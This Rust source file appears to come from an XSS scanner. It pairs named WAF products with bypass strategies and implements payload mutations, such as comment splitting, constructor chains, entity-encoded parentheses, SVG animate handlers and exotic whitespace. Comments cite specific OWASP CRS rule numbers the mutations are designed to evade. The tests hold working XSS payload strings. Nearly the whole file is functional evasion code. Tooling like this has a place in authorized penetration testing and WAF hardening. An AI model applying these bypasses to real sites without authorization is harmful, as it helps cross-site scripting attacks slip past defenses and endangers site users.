//! WAF-specific bypass strategies.
//!
//! Each detected WAF type maps to a set of encoding, mutation, and evasion
//! techniques optimized for that particular WAF.

use super::WafType;

/// Types of payload mutations that can be applied for WAF bypass.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum MutationType {
    /// Insert HTML comments inside tag names: `<scr<!---->ipt>`
    HtmlCommentSplit,
    /// Tab/newline between tag and attribute: `<img\t\nsrc=x>`
    WhitespaceMutation,
    /// JavaScript comment splitting: `al/**/ert(1)`
    JsCommentSplit,
    /// Backtick instead of parentheses: `` alert`1` ``
    BacktickParens,
    /// Constructor chain: `[].constructor.constructor('alert(1)')()`
    ConstructorChain,
    /// Unicode escapes in JS: `\u0061lert(1)`
    UnicodeJsEscape,
    /// Mixed decimal/hex HTML entities
    MixedHtmlEntities,
    /// Alternating case for HTML tags: `<ScRiPt>`
    CaseAlternation,
    // ── CRS-targeting mutations ─────────────────────────────────────
    /// Use `/` instead of space between tag and attributes: `<svg/onload=alert(1)>`
    /// Bypasses CRS 941160 regex that expects whitespace before attributes.
    SlashSeparator,
    /// Replace parentheses with HTML entities: `alert&#40;1&#41;`
    /// Bypasses CRS 941370 JS function call detection.
    HtmlEntityParens,
    /// SVG animate/set element execution: `<svg><animate onbegin=alert(1) attributeName=x>`
    /// Bypasses CRS 941110 tag denylist which may not include SVG animation elements.
    SvgAnimateExec,
    /// Exotic whitespace chars (vertical tab 0x0B, form feed 0x0C) between tag and attrs.
    /// Bypasses CRS 941320 tag handler regex that only checks \\s (space/tab/newline).
    ExoticWhitespace,
}

/// A bypass strategy composed of extra encoders and payload mutations.
#[derive(Debug, Clone, Default)]
pub struct BypassStrategy {
    /// Extra encoder names to add beyond user-specified ones.
    pub extra_encoders: Vec<String>,
    /// Payload mutations to apply.
    pub mutations: Vec<MutationType>,
    /// Extra delay (ms) hint to avoid rate-limiting WAFs.
    pub extra_delay_hint_ms: u64,
}

/// Get the optimal bypass strategy for a specific WAF type.
pub fn get_bypass_strategy(waf: &WafType) -> BypassStrategy {
    match waf {
        WafType::Cloudflare => BypassStrategy {
            extra_encoders: vec!["unicode".into(), "4url".into(), "zwsp".into()],
            mutations: vec![
                MutationType::HtmlCommentSplit,
                MutationType::BacktickParens,
                MutationType::JsCommentSplit,
                MutationType::CaseAlternation,
            ],
            extra_delay_hint_ms: 100,
        },
        WafType::AwsWaf => BypassStrategy {
            extra_encoders: vec!["2url".into(), "3url".into(), "unicode".into()],
            mutations: vec![
                MutationType::WhitespaceMutation,
                MutationType::UnicodeJsEscape,
                MutationType::ConstructorChain,
            ],
            extra_delay_hint_ms: 0,
        },
        WafType::Akamai => BypassStrategy {
            extra_encoders: vec!["3url".into(), "4url".into(), "unicode".into()],
            mutations: vec![
                MutationType::HtmlCommentSplit,
                MutationType::ConstructorChain,
                MutationType::CaseAlternation,
                MutationType::BacktickParens,
            ],
            extra_delay_hint_ms: 50,
        },
        WafType::Imperva => BypassStrategy {
            extra_encoders: vec!["zwsp".into(), "unicode".into(), "2url".into()],
            mutations: vec![
                MutationType::BacktickParens,
                MutationType::JsCommentSplit,
                MutationType::MixedHtmlEntities,
                MutationType::UnicodeJsEscape,
            ],
            extra_delay_hint_ms: 100,
        },
        WafType::ModSecurity => BypassStrategy {
            extra_encoders: vec!["4url".into(), "2url".into(), "unicode".into()],
            mutations: vec![
                MutationType::HtmlCommentSplit,
                MutationType::WhitespaceMutation,
                MutationType::CaseAlternation,
                MutationType::BacktickParens,
                MutationType::ConstructorChain,
            ],
            extra_delay_hint_ms: 0,
        },
        // OWASP CRS bypass: tuned for CRS rules 941100-941380.
        // CRS uses libinjection + regex patterns for XSS detection.
        // Key weaknesses:
        // - Slash-separated tag attributes bypass 941160 regex
        // - SVG animate/set elements bypass 941110 tag denylist
        // - HTML entity-encoded parens bypass 941370 JS function detection
        // - Exotic whitespace (0x0B, 0x0C) bypass 941320 tag handler
        // - Constructor chain and backtick bypass keyword-based rules
        WafType::OwaspCrs => BypassStrategy {
            extra_encoders: vec![
                "unicode".into(),
                "4url".into(),
                "2url".into(),
                "htmlpad".into(),
                "zwsp".into(),
            ],
            mutations: vec![
                MutationType::SlashSeparator,
                MutationType::SvgAnimateExec,
                MutationType::HtmlEntityParens,
                MutationType::ExoticWhitespace,
                MutationType::BacktickParens,
                MutationType::ConstructorChain,
                MutationType::CaseAlternation,
                MutationType::HtmlCommentSplit,
            ],
            extra_delay_hint_ms: 0,
        },
        WafType::Sucuri => BypassStrategy {
            extra_encoders: vec!["unicode".into(), "2url".into(), "zwsp".into()],
            mutations: vec![
                MutationType::BacktickParens,
                MutationType::WhitespaceMutation,
                MutationType::CaseAlternation,
            ],
            extra_delay_hint_ms: 0,
        },
        WafType::F5BigIp => BypassStrategy {
            extra_encoders: vec!["3url".into(), "unicode".into()],
            mutations: vec![
                MutationType::HtmlCommentSplit,
                MutationType::ConstructorChain,
                MutationType::UnicodeJsEscape,
            ],
            extra_delay_hint_ms: 0,
        },
        WafType::Barracuda => BypassStrategy {
            extra_encoders: vec!["2url".into(), "unicode".into()],
            mutations: vec![
                MutationType::MixedHtmlEntities,
                MutationType::WhitespaceMutation,
                MutationType::CaseAlternation,
            ],
            extra_delay_hint_ms: 0,
        },
        WafType::FortiWeb => BypassStrategy {
            extra_encoders: vec!["unicode".into(), "3url".into(), "zwsp".into()],
            mutations: vec![
                MutationType::HtmlCommentSplit,
                MutationType::BacktickParens,
                MutationType::UnicodeJsEscape,
            ],
            extra_delay_hint_ms: 0,
        },
        WafType::AzureWaf => BypassStrategy {
            extra_encoders: vec!["4url".into(), "unicode".into(), "zwsp".into()],
            mutations: vec![
                MutationType::HtmlCommentSplit,
                MutationType::UnicodeJsEscape,
                MutationType::ConstructorChain,
            ],
            extra_delay_hint_ms: 50,
        },
        WafType::CloudArmor => BypassStrategy {
            extra_encoders: vec!["2url".into(), "unicode".into()],
            mutations: vec![
                MutationType::BacktickParens,
                MutationType::MixedHtmlEntities,
                MutationType::CaseAlternation,
            ],
            extra_delay_hint_ms: 0,
        },
        WafType::Fastly => BypassStrategy {
            extra_encoders: vec!["3url".into(), "unicode".into()],
            mutations: vec![
                MutationType::WhitespaceMutation,
                MutationType::JsCommentSplit,
                MutationType::BacktickParens,
            ],
            extra_delay_hint_ms: 0,
        },
        WafType::Wordfence => BypassStrategy {
            extra_encoders: vec!["2url".into(), "unicode".into()],
            mutations: vec![
                MutationType::HtmlCommentSplit,
                MutationType::CaseAlternation,
                MutationType::BacktickParens,
                MutationType::WhitespaceMutation,
            ],
            extra_delay_hint_ms: 0,
        },
        WafType::Unknown(_) => BypassStrategy {
            extra_encoders: vec!["2url".into(), "unicode".into(), "zwsp".into()],
            mutations: vec![
                MutationType::HtmlCommentSplit,
                MutationType::BacktickParens,
                MutationType::CaseAlternation,
                MutationType::WhitespaceMutation,
            ],
            extra_delay_hint_ms: 0,
        },
    }
}

/// Merge bypass strategies from multiple detected WAFs into a single combined strategy.
pub fn merge_strategies(waf_types: &[&WafType]) -> BypassStrategy {
    let mut combined = BypassStrategy::default();
    let mut seen_encoders = std::collections::HashSet::new();
    let mut seen_mutations = std::collections::HashSet::new();

    for waf in waf_types {
        let strategy = get_bypass_strategy(waf);

        // Merge extra encoders (deduplicate via HashSet)
        for enc in strategy.extra_encoders {
            if !seen_encoders.contains(&enc) {
                seen_encoders.insert(enc.clone());
                combined.extra_encoders.push(enc);
            }
        }

        // Merge mutations (deduplicate via HashSet)
        for mutation in strategy.mutations {
            if !seen_mutations.contains(&mutation) {
                seen_mutations.insert(mutation.clone());
                combined.mutations.push(mutation);
            }
        }

        // Take the max delay hint
        combined.extra_delay_hint_ms = combined.extra_delay_hint_ms.max(strategy.extra_delay_hint_ms);
    }

    combined
}

/// Apply payload mutations to a list of base payloads, generating additional bypass variants.
/// Returns the original payloads plus mutated variants.
///
/// The `max_variants_per_payload` parameter caps how many mutation variants are generated
/// per base payload to prevent payload explosion.
pub fn apply_mutations(
    payloads: &[String],
    mutations: &[MutationType],
    max_variants_per_payload: usize,
) -> Vec<String> {
    let mut out = Vec::with_capacity(payloads.len() * (1 + max_variants_per_payload.min(mutations.len())));
    let mut seen = std::collections::HashSet::with_capacity(out.capacity());

    for payload in payloads {
        if seen.insert(payload.clone()) {
            out.push(payload.clone());
        }

        let mut variant_count = 0;
        for mutation in mutations {
            if variant_count >= max_variants_per_payload {
                break;
            }
            let variant = apply_single_mutation(payload, mutation);
            if variant != *payload && seen.insert(variant.clone()) {
                out.push(variant);
                variant_count += 1;
            }
        }
    }

    out
}

/// Apply a single mutation type to a payload.
fn apply_single_mutation(payload: &str, mutation: &MutationType) -> String {
    match mutation {
        MutationType::HtmlCommentSplit => html_comment_split(payload),
        MutationType::WhitespaceMutation => whitespace_mutation(payload),
        MutationType::JsCommentSplit => js_comment_split(payload),
        MutationType::BacktickParens => backtick_parens(payload),
        MutationType::ConstructorChain => constructor_chain(payload),
        MutationType::UnicodeJsEscape => unicode_js_escape(payload),
        MutationType::MixedHtmlEntities => mixed_html_entities(payload),
        MutationType::CaseAlternation => case_alternate(payload),
        MutationType::SlashSeparator => slash_separator(payload),
        MutationType::HtmlEntityParens => html_entity_parens(payload),
        MutationType::SvgAnimateExec => svg_animate_exec(payload),
        MutationType::ExoticWhitespace => exotic_whitespace(payload),
    }
}

// ── Mutation implementations ────────────────────────────────────────

/// Insert HTML comments in the middle of common HTML tag names.
/// `<script>` → `<scr<!---->ipt>`, `<img` → `<im<!---->g`
fn html_comment_split(payload: &str) -> String {
    // Split known tag names
    let replacements = [
        ("<script", "<scr<!---->ipt"),
        ("<SCRIPT", "<SCR<!---->IPT"),
        ("<Script", "<Scr<!---->ipt"),
        ("</script", "</scr<!---->ipt"),
        ("</SCRIPT", "</SCR<!---->IPT"),
        ("<img", "<im<!---->g"),
        ("<IMG", "<IM<!---->G"),
        ("<svg", "<sv<!---->g"),
        ("<SVG", "<SV<!---->G"),
        ("<iframe", "<ifr<!---->ame"),
        ("<IFRAME", "<IFR<!---->AME"),
    ];

    let mut result = payload.to_string();
    for (from, to) in &replacements {
        if result.contains(from) {
            result = result.replacen(from, to, 1);
            break; // Apply one split per payload to keep it valid
        }
    }
    result
}

/// Insert tabs/newlines/carriage returns between HTML tags and their attributes.
/// `<img src=x` → `<img\tsrc=x`
fn whitespace_mutation(payload: &str) -> String {
    let tag_attr_patterns = [
        ("<img src", "<img\tsrc"),
        ("<IMG src", "<IMG\tsrc"),
        ("<IMG SRC", "<IMG\tSRC"),
        ("<svg onload", "<svg\nonload"),
        ("<SVG ONLOAD", "<SVG\nONLOAD"),
        ("<SVG onload", "<SVG\nonload"),
        ("<sVg onload", "<sVg\nonload"),
        ("<svg/onload", "<svg\tonload"),
        ("<body onload", "<body\nonload"),
        ("<input onfocus", "<input\tonfocus"),
        ("<details open", "<details\ropen"),
        ("<marquee onstart", "<marquee\tonstart"),
        ("<video src", "<video\tsrc"),
        ("<audio src", "<audio\rsrc"),
    ];

    let mut result = payload.to_string();
    for (from, to) in &tag_attr_patterns {
        if result.contains(from) {
            result = result.replacen(from, to, 1);
            break;
        }
    }
    result
}

/// Split JavaScript function names with comments.
/// `alert(1)` → `al/**/ert(1)`
fn js_comment_split(payload: &str) -> String {
    let js_patterns = [
        ("alert(", "al/**/ert("),
        ("confirm(", "con/**/firm("),
        ("prompt(", "pro/**/mpt("),
        ("eval(", "ev/**/al("),
        ("alert`", "al/**/ert`"),
    ];

    let mut result = payload.to_string();
    for (from, to) in &js_patterns {
        if result.contains(from) {
            result = result.replacen(from, to, 1);
            break;
        }
    }
    result
}

/// Replace function call parentheses with backtick template literals.
/// `alert(1)` → `` alert`1` ``
fn backtick_parens(payload: &str) -> String {
    let parens_patterns = [
        ("alert(1)", "alert`1`"),
        ("alert(document.domain)", "alert`${document.domain}`"),
        ("alert(document.cookie)", "alert`${document.cookie}`"),
        ("confirm(1)", "confirm`1`"),
        ("prompt(1)", "prompt`1`"),
    ];

    let mut result = payload.to_string();
    for (from, to) in &parens_patterns {
        if result.contains(from) {
            result = result.replacen(from, to, 1);
            break;
        }
    }
    result
}

/// Replace alert() calls with constructor chain to avoid keyword detection.
/// `alert(1)` → `[].constructor.constructor('alert(1)')()`
fn constructor_chain(payload: &str) -> String {
    let patterns = [
        ("alert(1)", "[].constructor.constructor('alert(1)')()"),
        ("alert(document.domain)", "[].constructor.constructor('alert(document.domain)')()"),
        ("confirm(1)", "[].constructor.constructor('confirm(1)')()"),
        ("prompt(1)", "[].constructor.constructor('prompt(1)')()"),
    ];

    let mut result = payload.to_string();
    for (from, to) in &patterns {
        if result.contains(from) {
            result = result.replacen(from, to, 1);
            break;
        }
    }
    result
}

/// Replace first chars of JS function names with unicode escapes.
/// `alert` → `\u0061lert`
fn unicode_js_escape(payload: &str) -> String {
    let patterns = [
        ("alert", "\\u0061lert"),
        ("confirm", "\\u0063onfirm"),
        ("prompt", "\\u0070rompt"),
        ("eval", "\\u0065val"),
        ("document", "\\u0064ocument"),
    ];

    let mut result = payload.to_string();
    for (from, to) in &patterns {
        if result.contains(from) {
            result = result.replacen(from, to, 1);
            break;
        }
    }
    result
}

/// Encode angle brackets with mixed decimal and hex HTML entities.
/// `<` → `&#60;` (decimal), `>` → `&#x3e;` (hex)
fn mixed_html_entities(payload: &str) -> String {
    let mut result = String::with_capacity(payload.len() * 3);
    let mut use_decimal = true;
    for c in payload.chars() {
        match c {
            '<' => {
                if use_decimal {
                    result.push_str("&#60;");
                } else {
                    result.push_str("&#x3c;");
                }
                use_decimal = !use_decimal;
            }
            '>' => {
                if use_decimal {
                    result.push_str("&#62;");
                } else {
                    result.push_str("&#x3e;");
                }
                use_decimal = !use_decimal;
            }
            '"' => {
                if use_decimal {
                    result.push_str("&#34;");
                } else {
                    result.push_str("&#x22;");
                }
                use_decimal = !use_decimal;
            }
            '\'' => {
                if use_decimal {
                    result.push_str("&#39;");
                } else {
                    result.push_str("&#x27;");
                }
                use_decimal = !use_decimal;
            }
            _ => result.push(c),
        }
    }
    result
}

// ── CRS-targeting mutation implementations ──────────────────────

/// Replace space between HTML tag and attribute with `/`.
/// `<svg onload=alert(1)>` → `<svg/onload=alert(1)>`
/// `<img src=x onerror=alert(1)>` → `<img/src=x onerror=alert(1)>`
fn slash_separator(payload: &str) -> String {
    let patterns = [
        ("<svg onload", "<svg/onload"),
        ("<SVG ONLOAD", "<SVG/ONLOAD"),
        ("<SVG onload", "<SVG/onload"),
        ("<img src", "<img/src"),
        ("<IMG SRC", "<IMG/SRC"),
        ("<IMG src", "<IMG/src"),
        ("<details open", "<details/open"),
        ("<input onfocus", "<input/onfocus"),
        ("<body onload", "<body/onload"),
        ("<marquee onstart", "<marquee/onstart"),
        ("<video src", "<video/src"),
        ("<audio src", "<audio/src"),
    ];

    let mut result = payload.to_string();
    for (from, to) in &patterns {
        if result.contains(from) {
            result = result.replacen(from, to, 1);
            break;
        }
    }
    result
}

/// Replace parentheses with HTML entities to bypass JS function call detection.
/// `alert(1)` → `alert&#40;1&#41;`
/// Also supports `&lpar;`/`&rpar;` named entities.
fn html_entity_parens(payload: &str) -> String {
    // Replace all occurrences of ( and ) with HTML decimal entities
    let mut result = payload.to_string();
    // Use &#40; for ( and &#41; for )
    if result.contains('(') || result.contains(')') {
        result = result.replace('(', "&#40;").replace(')', "&#41;");
    }
    result
}

/// Generate SVG animate element-based execution payload.
/// If the payload contains `<svg onload=X>`, transform to `<svg><animate onbegin=X attributeName=x dur=1s>`
/// For other payloads containing event handlers, wrap in SVG animate.
fn svg_animate_exec(payload: &str) -> String {
    // Transform svg onload variants to svg animate onbegin
    for prefix in &["<svg onload=", "<SVG ONLOAD=", "<sVg onload="] {
        if let Some(rest) = payload.strip_prefix(prefix)
            && let Some(handler_end) = rest.find('>')
        {
            let handler = &rest[..handler_end];
            let clean_handler = handler.split_whitespace().next().unwrap_or(handler);
            return format!(
                "<svg><animate onbegin={} attributeName=x dur=1s>",
                clean_handler
            );
        }
    }
    // Also transform img onerror to svg animate
    if payload.contains("<img") || payload.contains("<IMG") || payload.contains("<im") {
        for prefix in &["onerror=", "ONERROR="] {
            if let Some(idx) = payload.find(prefix) {
                let after = &payload[idx + prefix.len()..];
                let handler_end = after
                    .find([' ', '>', '\t', '\n'])
                    .unwrap_or(after.len());
                let handler = &after[..handler_end];
                return format!(
                    "<svg><animate onbegin={} attributeName=x dur=1s>",
                    handler
                );
            }
        }
    }
    payload.to_string()
}

/// Insert exotic whitespace characters (vertical tab, form feed) between tag and attributes.
/// `<img src=x onerror=alert(1)>` → `<img\x0Bsrc=x\x0Conerror=alert(1)>`
fn exotic_whitespace(payload: &str) -> String {
    // Patterns: (from, tag, exotic_char, attr)
    // Using VT=\x0B and FF=\x0C between tag and attributes
    const PATTERNS: &[(&str, &str, char, &str)] = &[
        ("<img src",        "<img",     '\x0B', "src"),
        ("<IMG src",        "<IMG",     '\x0B', "src"),
        ("<IMG SRC",        "<IMG",     '\x0B', "SRC"),
        ("<svg onload",     "<svg",     '\x0C', "onload"),
        ("<SVG ONLOAD",     "<SVG",     '\x0C', "ONLOAD"),
        ("<svg/onload",     "<svg",     '\x0B', "onload"),
        ("<body onload",    "<body",    '\x0C', "onload"),
        ("<input onfocus",  "<input",   '\x0B', "onfocus"),
        ("<details open",   "<details", '\x0C', "open"),
        ("<marquee onstart","<marquee", '\x0B', "onstart"),
    ];

    for &(from, tag, ws, attr) in PATTERNS {
        if payload.contains(from) {
            let mut result = payload.to_string();
            let replacement = format!("{}{}{}", tag, ws, attr);
            result = result.replacen(from, &replacement, 1);
            return result;
        }
    }
    payload.to_string()
}

/// Alternate the case of HTML tag characters.
/// `<script>` → `<ScRiPt>`, `<img` → `<ImG`
fn case_alternate(payload: &str) -> String {
    let mut result = String::with_capacity(payload.len());
    let mut in_tag = false;
    let mut tag_char_idx = 0u32;

    for c in payload.chars() {
        if c == '<' {
            in_tag = true;
            tag_char_idx = 0;
            result.push(c);
        } else if c == '>' || c == ' ' || c == '\t' || c == '\n' || c == '/' {
            in_tag = false;
            result.push(c);
        } else if in_tag && c.is_ascii_alphabetic() {
            if tag_char_idx.is_multiple_of(2) {
                result.push(c.to_ascii_uppercase());
            } else {
                result.push(c.to_ascii_lowercase());
            }
            tag_char_idx += 1;
        } else {
            result.push(c);
        }
    }
    result
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_html_comment_split() {
        assert_eq!(
            html_comment_split("<script>alert(1)</script>"),
            "<scr<!---->ipt>alert(1)</script>"
        );
        assert_eq!(
            html_comment_split("<img src=x onerror=alert(1)>"),
            "<im<!---->g src=x onerror=alert(1)>"
        );
    }

    #[test]
    fn test_whitespace_mutation() {
        assert_eq!(
            whitespace_mutation("<img src=x onerror=alert(1)>"),
            "<img\tsrc=x onerror=alert(1)>"
        );
        assert_eq!(
            whitespace_mutation("<svg onload=alert(1)>"),
            "<svg\nonload=alert(1)>"
        );
    }

    #[test]
    fn test_js_comment_split() {
        assert_eq!(js_comment_split("alert(1)"), "al/**/ert(1)");
        assert_eq!(js_comment_split("confirm(1)"), "con/**/firm(1)");
    }

    #[test]
    fn test_backtick_parens() {
        assert_eq!(backtick_parens("alert(1)"), "alert`1`");
        assert_eq!(backtick_parens("confirm(1)"), "confirm`1`");
    }

    #[test]
    fn test_constructor_chain() {
        assert_eq!(
            constructor_chain("alert(1)"),
            "[].constructor.constructor('alert(1)')()"
        );
    }

    #[test]
    fn test_unicode_js_escape() {
        assert_eq!(unicode_js_escape("alert(1)"), "\\u0061lert(1)");
    }

    #[test]
    fn test_mixed_html_entities() {
        let result = mixed_html_entities("<img src=x>");
        assert!(!result.contains('<'));
        assert!(!result.contains('>'));
        assert!(result.contains("&#60;") || result.contains("&#x3c;"));
    }

    #[test]
    fn test_case_alternate() {
        let result = case_alternate("<script>");
        assert!(result.contains('S') || result.contains('C'));
        // Should have mixed case
        assert_ne!(result, "<script>");
        assert_ne!(result, "<SCRIPT>");
    }

    #[test]
    fn test_get_bypass_strategy_cloudflare() {
        let strategy = get_bypass_strategy(&WafType::Cloudflare);
        assert!(!strategy.extra_encoders.is_empty());
        assert!(!strategy.mutations.is_empty());
        assert!(strategy.extra_encoders.contains(&"unicode".to_string()));
    }

    #[test]
    fn test_merge_strategies() {
        let waf_types = vec![&WafType::Cloudflare, &WafType::ModSecurity];
        let merged = merge_strategies(&waf_types);
        // Should contain encoders from both
        assert!(merged.extra_encoders.contains(&"unicode".to_string()));
        assert!(merged.extra_encoders.contains(&"4url".to_string()));
        // No duplicates
        let mut seen = std::collections::HashSet::new();
        assert!(merged.extra_encoders.iter().all(|e| seen.insert(e)));
    }

    #[test]
    fn test_apply_mutations_limit() {
        let payloads = vec!["<script>alert(1)</script>".to_string()];
        let mutations = vec![
            MutationType::HtmlCommentSplit,
            MutationType::CaseAlternation,
            MutationType::BacktickParens,
            MutationType::JsCommentSplit,
        ];
        // Limit to 2 variants per payload
        let result = apply_mutations(&payloads, &mutations, 2);
        // Original + at most 2 variants
        assert!(result.len() <= 3);
        assert_eq!(result[0], "<script>alert(1)</script>");
    }

    #[test]
    fn test_apply_mutations_dedup() {
        let payloads = vec!["no_match_here".to_string()];
        let mutations = vec![MutationType::HtmlCommentSplit, MutationType::BacktickParens];
        let result = apply_mutations(&payloads, &mutations, 5);
        // No mutation matched, so just the original
        assert_eq!(result.len(), 1);
    }

    #[test]
    fn test_every_waf_has_strategy() {
        let waf_types = vec![
            WafType::Cloudflare, WafType::AwsWaf, WafType::Akamai,
            WafType::Imperva, WafType::ModSecurity, WafType::OwaspCrs,
            WafType::Sucuri, WafType::F5BigIp, WafType::Barracuda,
            WafType::FortiWeb, WafType::AzureWaf, WafType::CloudArmor,
            WafType::Fastly, WafType::Wordfence,
            WafType::Unknown("test".to_string()),
        ];
        for waf in &waf_types {
            let strategy = get_bypass_strategy(waf);
            assert!(!strategy.extra_encoders.is_empty(), "WAF {:?} has no extra encoders", waf);
            assert!(!strategy.mutations.is_empty(), "WAF {:?} has no mutations", waf);
        }
    }

    #[test]
    fn test_owasp_crs_strategy() {
        let strategy = get_bypass_strategy(&WafType::OwaspCrs);
        // CRS strategy should include all CRS-targeting mutations
        assert!(strategy.mutations.contains(&MutationType::SlashSeparator));
        assert!(strategy.mutations.contains(&MutationType::SvgAnimateExec));
        assert!(strategy.mutations.contains(&MutationType::HtmlEntityParens));
        assert!(strategy.mutations.contains(&MutationType::ExoticWhitespace));
        // Should include unicode and multi-url encoding
        assert!(strategy.extra_encoders.contains(&"unicode".to_string()));
        assert!(strategy.extra_encoders.contains(&"4url".to_string()));
    }

    #[test]
    fn test_slash_separator() {
        assert_eq!(
            slash_separator("<svg onload=alert(1)>"),
            "<svg/onload=alert(1)>"
        );
        assert_eq!(
            slash_separator("<img src=x onerror=alert(1)>"),
            "<img/src=x onerror=alert(1)>"
        );
    }

    #[test]
    fn test_html_entity_parens() {
        assert_eq!(
            html_entity_parens("alert(1)"),
            "alert&#40;1&#41;"
        );
        assert_eq!(
            html_entity_parens("<img src=x onerror=alert(1)>"),
            "<img src=x onerror=alert&#40;1&#41;>"
        );
    }

    #[test]
    fn test_svg_animate_exec() {
        let result = svg_animate_exec("<svg onload=alert(1)>");
        assert!(result.contains("<svg><animate"));
        assert!(result.contains("onbegin=alert(1)"));
        assert!(result.contains("attributeName=x"));
    }

    #[test]
    fn test_svg_animate_exec_from_img() {
        let result = svg_animate_exec("<img src=x onerror=alert(1)>");
        assert!(result.contains("<svg><animate"));
        assert!(result.contains("onbegin=alert(1)"));
    }

    #[test]
    fn test_exotic_whitespace() {
        let result = exotic_whitespace("<img src=x onerror=alert(1)>");
        assert!(result.contains('\x0B') || result.contains('\x0C'));
        assert!(!result.contains("<img src"));
    }

    #[test]
    fn test_exotic_whitespace_svg() {
        let result = exotic_whitespace("<svg onload=alert(1)>");
        assert!(result.contains('\x0B') || result.contains('\x0C'));
    }
}
